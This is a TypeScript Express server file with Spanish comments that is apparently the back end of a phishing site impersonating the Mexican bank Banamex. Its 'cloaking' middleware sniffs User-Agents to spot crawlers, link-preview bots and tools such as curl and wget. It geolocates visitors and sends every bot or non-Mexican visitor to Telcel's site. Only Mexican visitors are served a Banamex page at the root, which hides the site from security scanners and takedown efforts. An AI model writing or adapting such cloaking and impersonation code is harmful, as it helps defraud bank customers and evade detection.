import express, { type Request, Response, NextFunction } from "express";
import { registerRoutes } from "./routes";
import { setupVite, serveStatic, log } from "./vite";
import cookieParser from "cookie-parser";
import dotenv from "dotenv";
import geoip from "geoip-lite";

// Cargar variables de entorno
dotenv.config();

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());

// Configuración del entorno
const APP_TYPE = process.env.APP_TYPE || 'admin';
console.log(`Ejecutando en modo: ${APP_TYPE}`);

// Configurar CORS para permitir diferentes dominios
app.use((req, res, next) => {
  const allowedOrigins = [
    process.env.ADMIN_DOMAIN || 'https://admin.tudominio.com',
    process.env.CLIENT_DOMAIN || 'https://client.tudominio.com'
  ];

  const origin = req.headers.origin;
  if (origin && allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  }

  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Allow-Credentials', 'true');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  const start = Date.now();
  const path = req.path;
  let capturedJsonResponse: Record<string, any> | undefined = undefined;

  const originalResJson = res.json;
  res.json = function (bodyJson, ...args) {
    capturedJsonResponse = bodyJson;
    return originalResJson.apply(res, [bodyJson, ...args]);
  };

  res.on("finish", () => {
    const duration = Date.now() - start;
    if (path.startsWith("/api")) {
      let logLine = `${req.method} ${path} ${res.statusCode} in ${duration}ms`;
      if (capturedJsonResponse) {
        logLine += ` :: ${JSON.stringify(capturedJsonResponse)}`;
      }

      if (logLine.length > 80) {
        logLine = logLine.slice(0, 79) + "…";
      }

      log(logLine);
    }
  });

  next();
});

(async () => {
  // Middleware de cloaking - filtrar por geolocalización y detectar bots
  app.use((req: Request, res: Response, next: NextFunction) => {
    // Permitir acceso a rutas de API y admin sin filtro
    if (req.path.startsWith('/api') || req.path.startsWith('/admin')) {
      return next();
    }

    // Obtener la IP real del cliente (considerando proxies)
    const clientIp = (req.headers['x-forwarded-for'] as string)?.split(',')[0].trim() 
                     || req.headers['x-real-ip'] as string
                     || req.socket.remoteAddress 
                     || '';

    // Permitir IPs locales/privadas para desarrollo
    const localIPs = ['127.0.0.1', '::1', 'localhost', '::ffff:127.0.0.1'];
    const isLocalIP = localIPs.includes(clientIp) || 
                      clientIp.startsWith('192.168.') || 
                      clientIp.startsWith('10.') ||
                      clientIp.startsWith('172.16.') ||
                      clientIp.startsWith('172.17.') ||
                      clientIp.startsWith('172.18.') ||
                      clientIp.startsWith('172.19.') ||
                      clientIp.startsWith('172.20.') ||
                      clientIp.startsWith('172.21.') ||
                      clientIp.startsWith('172.22.') ||
                      clientIp.startsWith('172.23.') ||
                      clientIp.startsWith('172.24.') ||
                      clientIp.startsWith('172.25.') ||
                      clientIp.startsWith('172.26.') ||
                      clientIp.startsWith('172.27.') ||
                      clientIp.startsWith('172.28.') ||
                      clientIp.startsWith('172.29.') ||
                      clientIp.startsWith('172.30.') ||
                      clientIp.startsWith('172.31.');

    if (isLocalIP) {
      console.log(`[Cloaker] ✓ IP local/desarrollo permitida: ${clientIp}`);
      return next();
    }

    // Detectar bots por User-Agent
    const userAgent = req.headers['user-agent'] || '';
    const botPatterns = [
      /bot/i, /crawl/i, /spider/i, /slurp/i, /mediapartners/i,
      /googlebot/i, /bingbot/i, /yahoo/i, /baiduspider/i,
      /facebookexternalhit/i, /twitterbot/i, /linkedinbot/i,
      /whatsapp/i, /telegram/i, /slack/i, /discord/i,
      /curl/i, /wget/i, /python/i, /java/i, /php/i
    ];
    
    const isBot = botPatterns.some(pattern => pattern.test(userAgent));

    // Si es un bot, redirigir a Telcel
    if (isBot) {
      console.log(`[Cloaker] Bot detectado: ${userAgent.substring(0, 50)} - IP: ${clientIp}`);
      return res.redirect('https://www.telcel.com/iphone');
    }

    // Obtener información de geolocalización
    const geo = geoip.lookup(clientIp);
    
    // Si no se puede determinar la ubicación O no es de México, redirigir a Telcel
    if (!geo || geo.country !== 'MX') {
      const country = geo?.country || 'Desconocido';
      console.log(`[Cloaker] IP no mexicana detectada: ${clientIp} (${country})`);
      return res.redirect('https://www.telcel.com/iphone');
    }

    // Si es de México y no es bot, permitir acceso
    console.log(`[Cloaker] ✓ Acceso permitido - IP mexicana: ${clientIp} (${geo.city || 'Ciudad desconocida'})`);
    next();
  });

  // Servir archivos estáticos de Banamex ANTES de todo
  app.use('/banamex', express.static('public/banamex'));

  // Interceptar la ruta raíz para servir la página de Banamex ANTES de cualquier otra ruta
  app.get('/', (_req: Request, res: Response) => {
    res.sendFile('banamex/index.html', { root: 'public' });
  });

  const server = await registerRoutes(app);

  app.use((err: any, _req: Request, res: Response, _next: NextFunction) => {
    const status = err.status || err.statusCode || 500;
    const message = err.message || "Internal Server Error";

    res.status(status).json({ message });
    throw err;
  });

  // importantly only setup vite in development and after
  // setting up all the other routes so the catch-all route
  // doesn't interfere with the other routes
  if (app.get("env") === "development") {
    await setupVite(app, server);
  } else {
    serveStatic(app);
  }

  // ALWAYS serve the app on port 5000
  // this serves both the API and the client.
  // It is the only port that is not firewalled.
  const port = 5000;
  server.listen({
    port,
    host: "0.0.0.0",
    reusePort: true,
  }, () => {
    log(`serving on port ${port}`);
  });
})();